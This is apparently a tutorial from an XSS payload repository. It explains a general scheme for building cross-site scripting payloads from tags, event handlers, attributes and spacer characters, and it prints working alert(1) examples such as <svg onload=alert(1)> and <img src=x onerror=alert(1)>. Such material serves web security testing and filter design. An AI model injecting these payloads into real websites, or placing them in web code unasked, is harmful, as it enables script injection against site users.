# **XSS-payloads**
### XSS payload scheme

Aside from the classic XSS payload <script>alert(1)</script> and source based ones like <a href=x>, we can start building payloads using the following simple scheme:
```
<tag handler=code>
````
Where we have the HTML tag, the event handler associated with it and the javascript code to execute.
But although it’s true for short payloads like <svg onload=alert(1)>, some payloads like <b onclick=alert(1)> that requires user
 interaction for example, needs a text to be clicked for the javascript code be triggered:
```
<b onclick=alert(1)>click me!
```
 
Some payloads also need tag attribute(s) inside it:

```
<img src=x onerror=alert(1)>
```
And some needs something before it:

```
<frameset><frame src onload=alert(1)>
```
So let’s make a better scheme:

```
extra1 <tag extra2 handler=code> extra3
```
It has the following variation:
```
extra1 <tag handler=code extra2> extra3
```
Almost there. There’s also an important thing to consider: the spaces inside the tag. In the major browsers, we can have a slash between tag and handler, for example:

```
<svg/onload=alert(1)>
```
This and other characters are allowed between tag and handler, tag and attribute, attribute and handler etc without change the syntax.

Here is our final scheme:
```
extra1 <tag spacer1 extra2 spacer2 handler spacer3 = spacer4 code spacer5> extra3
```
Variation:
```
extra1 <tag spacer1 handler spacer3 = spacer4 code spacer5 extra2> extra3 (without spacer2)
```
